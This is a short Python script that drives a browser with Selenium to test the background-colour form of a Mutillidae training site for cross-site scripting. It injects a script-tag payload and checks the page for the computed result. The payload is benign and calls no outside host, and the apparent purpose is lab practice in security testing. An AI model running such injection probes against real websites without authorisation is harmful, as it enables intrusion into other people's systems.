from selenium import webdriver
from bs4 import BeautifulSoup
from prettytable import PrettyTable
import sys, time
import optparse

class XSSAttack():
	java_script = "<script>var r=1; for(var i=0;i<10;i++) r=2*r; document.write(r);</script>"
	answ = "1024"

	def __init__(self, url):
		self.url = url		
		try:	
			useragent = "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
			profile = webdriver.FirefoxProfile()
			profile.set_preference("general.useragent.override",useragent)
			self.browser = webdriver.Firefox(profile)
		except Exception, e:
			print " [!] Browser object creation error:", e

	def __wait(self):
		time.sleep(2)

	def close(self):
		self.browser.close()
		
	def attack(self):
		if self.browser == None:
			return
		try:
			print " [-] Openning '%s'\n"%(self.url+"/index.php?page=set-background-color.php")
			self.browser.get(self.url+"/index.php?page=set-background-color.php")
			self.__wait()
			
			print " [-] Injecting string: %s\n"%XSSAttack.java_script
			
			bgcolor = self.browser.find_element_by_name("background_color")
			btn = self.browser.find_element_by_name("set-background-color-php-submit-button")

			bgcolor.send_keys(XSSAttack.java_script)
			btn.click()
			self.__wait()

			page_src = self.browser.page_source
			
			soup = BeautifulSoup(page_src, "lxml")
			info = soup.find("td", "informative-message").get_text()

			if info.find(XSSAttack.answ) != -1:
				print " [*] Attack was successful"
			else:
				print " [*] Attack was not successful, parameter is not injectable"
		except Exception, e:
			print " [!] Attack was not successfull, error:", e

def main():
	parser = optparse.OptionParser("Usage: %prog -u <url> or %prog --url=<url>")
	parser.add_option("-u", "--url", dest="url", help="mutillidae home")
	options, args = parser.parse_args()
	if options.url == None:
		parser.print_help()
		sys.exit(0)
	
	attacker = XSSAttack(options.url)
	attacker.attack()
	attacker.close()

if __name__ == "__main__":
	main()
